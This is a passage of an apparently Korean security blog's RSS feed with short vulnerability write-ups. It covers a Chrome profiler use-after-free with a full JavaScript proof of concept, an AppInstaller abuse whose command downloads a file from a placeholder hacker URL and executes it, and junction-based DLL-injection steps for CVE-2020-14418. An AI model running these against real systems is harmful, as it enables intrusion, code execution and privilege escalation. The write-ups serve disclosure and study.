      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/05/fabu1ous/2020-12-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Chrome UAF in StopProfiler</title>
      <link>https://hackyboiz.github.io/2020/12/04/l0ch/2020-12-04/</link>
      <guid>https://hackyboiz.github.io/2020/12/04/l0ch/2020-12-04/</guid>
      <pubDate>Fri, 04 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=111</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU 등의 리소스 사용량을 모니터링할 수 있는 <code>profiler</code> 객체에서 비동기 처리 키워드를 사용한 UAF 취약점이 발견되었습니다. </p><p>해당 취약점의 POC는 다음과 같습니다.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> 함수의 resolve는 사용자 정의 함수를 호출할 수 있습니다. </p><p>비동기 함수로 선언한 <code>main</code> 함수에서 <code>await</code> 키워드로 <code>performance.profile</code> 객체를 선언하고 <code>Object.prototype.__defineGetter__</code> 의 사용자 정의 함수와 main에서 <code>stop</code> 을 두 번 호출하게 되면  <code>CpuProfile</code> 객체가 삭제됩니다. 결과적으로 <code>CpuProfile</code> 에서 UAF 취약점을 트리거할 수 있습니다.</p><p>이는 간단하지만 높은 심각성의 UAF 취약점으로, Google은 <code>Profiler::stop</code> 에서 동기 스크립트 실행을 방지하도록 패치했습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/asynchronous/">asynchronous</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/04/l0ch/2020-12-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</title>
      <link>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/</link>
      <guid>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/</guid>
      <pubDate>Thu, 03 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://twitter.com/notwhickey/status/1333900137232523264</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p><p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbin/">lolbin</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbas/">lolbas</category>
      
      <category domain="https://hackyboiz.github.io/tags/appinstaller/">appinstaller</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-14418 : madCodeHook library LPE</title>
      <link>https://hackyboiz.github.io/2020/12/02/fabu1ous/2020-12-02/</link>
      <guid>https://hackyboiz.github.io/2020/12/02/fabu1ous/2020-12-02/</guid>
      <pubDate>Wed, 02 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.nettitude.com/blog/cve-2020-14418-madcodehoo</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHook은 다양한 API hooking 기능을 지원하는 third party 라이브러리입니다. madCodeHook라이브러리에 포함된 <code>ExprevDriver.sys</code>라는 드라이버는 유저 모드 프로세스에 <code>Protector32.dll</code> 혹은 <code>Protector64.dll</code>을 삽입해 그 프로세스를 보호 및 감시할 수 있습니다. DLL injection 공격을 방지하는 기능과 프로세스 모니터링 기능을 제공하므로 몇몇 보안 제품에서 madCodeHook 라이브러리를 사용합니다.</p><p>아이러니하게도 DLL injection을 방지하기 위해 사용되는 <code>ExprevDriver.sys</code> 드라이버에 path redirection을 이용한 toctou 취약점이 존재하고, 해커는 이를 악용해 DLL injection을 할 수 있습니다.</p><ol><li><p>실제  <code>Protector64.dll</code>이 존재하는 디렉터리를 가리키는 juction을 생성합니다.</p><pre><code class="hljs powershell">“mklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprev”</code></pre></li><li><p><code>ExprevDriver.sys</code>에 IOCTL을 넘겨줍니다.</p><pre><code class="hljs latex">“C:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dll”</code></pre><p>IOCTL을 사용해  <code>ExprevDriver.sys</code>가 삽입할 DLL의 경로와 대상 프로세스를 지정할 수 있습니다.  <code>ExprevDriver.sys</code>는 DLL을 삽입하기 전에 DLL의 전자서명을 검증하는 단계를 거치는데,  IOCTL로 설정된 경로를 사용합니다. Protector64.dll의 경로를 1번에서 만들어 둔 juction으로 설정해줍니다.</p></li><li><p>디렉터리 juction을 삭제하고 가짜 <code>Protector64.dll</code>을 생성합니다.</p><p>DLL의 전자서명 검증 이후 juction을 삭제하고 2번 단계에서 지정해준 경로에 <code>Protector64.dll</code>라는 이름의 악성 DLL을 생성합니다.</p></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/02/fabu1ous/2020-12-02/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
